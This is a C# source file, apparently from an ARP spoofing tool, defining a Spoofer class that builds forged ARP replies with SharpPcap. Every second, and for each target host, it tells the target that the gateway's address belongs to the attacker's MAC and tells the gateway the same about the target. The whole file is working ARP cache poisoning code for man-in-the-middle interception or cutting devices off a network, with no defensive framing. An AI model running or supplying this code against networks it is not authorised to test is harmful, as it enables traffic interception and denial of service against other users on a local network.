using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace CSArp.Logic
{
    public class Spoofer
    {
        private readonly Action<string> _log;
        private readonly object _sendSync = new object();
        private readonly object _sync = new object();
        private int _activeTargetCount;
        private CancellationTokenSource? _spoofingCts;
        private List<Task> _spoofingTasks = new List<Task>();
        public Spoofer(Action<string>? log = null)
        {
            _log = log ?? (msg => Debug.Print(msg));
        }

        public event Action<bool>? SpoofingStateChanged;

        public bool IsSpoofing {
            get {
                lock (_sync)
                {
                    return _spoofingCts != null
                        && !_spoofingCts.IsCancellationRequested
                        && _spoofingTasks.Exists(task => !task.IsCompleted);
                }
            }
        }
        public void Start(
            IReadOnlyDictionary<IPAddress, PhysicalAddress> targets,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice networkAdapter)
        {
            StopAll();

            if (targets == null || targets.Count == 0)
            {
                _log("Spoofing task skipped because there are no targets.");
                return;
            }

            CancellationTokenSource spoofingCts;
            lock (_sync)
            {
                _spoofingCts = new CancellationTokenSource();
                _activeTargetCount = targets.Count;
                spoofingCts = _spoofingCts;
            }

            SpoofingStateChanged?.Invoke(true);

            if (!networkAdapter.Opened)
            {
                networkAdapter.Open();
            }

            if (networkAdapter.MacAddress == null)
            {
                _log("Spoofing task skipped because adapter MAC address is unavailable.");
                lock (_sync)
                {
                    _spoofingCts?.Dispose();
                    _spoofingCts = null;
                    _activeTargetCount = 0;
                }
                SpoofingStateChanged?.Invoke(false);
                return;
            }

            _log($"Spoofing task started for {_activeTargetCount} target(s).");

            var tasks = new List<Task>();
            foreach (var target in targets)
            {
                var spoofTask = Task.Run(
                    () => SendSpoofingPacket(target.Key, target.Value, gatewayIpAddress, gatewayMacAddress, networkAdapter, spoofingCts.Token),
                    spoofingCts.Token);
                tasks.Add(spoofTask);
            }

            lock (_sync)
            {
                _spoofingTasks = tasks;
            }
        }

        public void StopAll()
        {
            CancellationTokenSource? ctsToCancel;
            Task[] tasksToWait;
            lock (_sync)
            {
                if (_spoofingCts == null || _spoofingCts.IsCancellationRequested)
                {
                    return;
                }

                ctsToCancel = _spoofingCts;
                tasksToWait = _spoofingTasks.ToArray();
            }

            ctsToCancel.Cancel();
            try
            {
                if (tasksToWait.Length > 0)
                {
                    Task.WaitAll(tasksToWait, TimeSpan.FromSeconds(2));
                }
            }
            catch (AggregateException)
            {
            }

            lock (_sync)
            {
                _spoofingTasks = new List<Task>();
                _spoofingCts?.Dispose();
                _spoofingCts = null;
            }

            _log($"Spoofing task stopped for {_activeTargetCount} target(s).");
            _activeTargetCount = 0;
            SpoofingStateChanged?.Invoke(false);
        }

        private static EthernetPacket BuildPoisonReplyPacket(
            PhysicalAddress senderMacAddress,
            PhysicalAddress destinationMacAddress,
            IPAddress spoofedProtocolAddress,
            IPAddress destinationProtocolAddress)
        {
            var arpReply = new ArpPacket(
                ArpOperation.Response,
                destinationMacAddress,
                destinationProtocolAddress,
                senderMacAddress,
                spoofedProtocolAddress);
            return new EthernetPacket(senderMacAddress, destinationMacAddress, EthernetType.Arp)
            {
                PayloadPacket = arpReply
            };
        }

        private async Task SendSpoofingPacket(
                    IPAddress ipAddress,
            PhysicalAddress physicalAddress,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice captureDevice,
            CancellationToken cancellationToken)
        {
            _log($"Spoofing target {physicalAddress.ToString("-")} @ {ipAddress}");

            if (captureDevice.MacAddress == null)
            {
                _log($"Adapter MAC address unavailable; skipping spoofing thread for {ipAddress}");
                return;
            }

            var packetToTarget = BuildPoisonReplyPacket(
                senderMacAddress: captureDevice.MacAddress,
                destinationMacAddress: physicalAddress,
                spoofedProtocolAddress: gatewayIpAddress,
                destinationProtocolAddress: ipAddress);
            var packetToGateway = BuildPoisonReplyPacket(
                senderMacAddress: captureDevice.MacAddress,
                destinationMacAddress: gatewayMacAddress,
                spoofedProtocolAddress: ipAddress,
                destinationProtocolAddress: gatewayIpAddress);

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    lock (_sendSync)
                    {
                        captureDevice.SendPacket(packetToTarget);
                        captureDevice.SendPacket(packetToGateway);
                    }
                    await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (PcapException ex)
            {
                _log($"PcapException @ Spoofer.SendSpoofingPacket() [{ex.Message}]");
            }

            _log($"Spoofing thread terminating for {physicalAddress.ToString("-")} @ {ipAddress}");
        }
    }
}
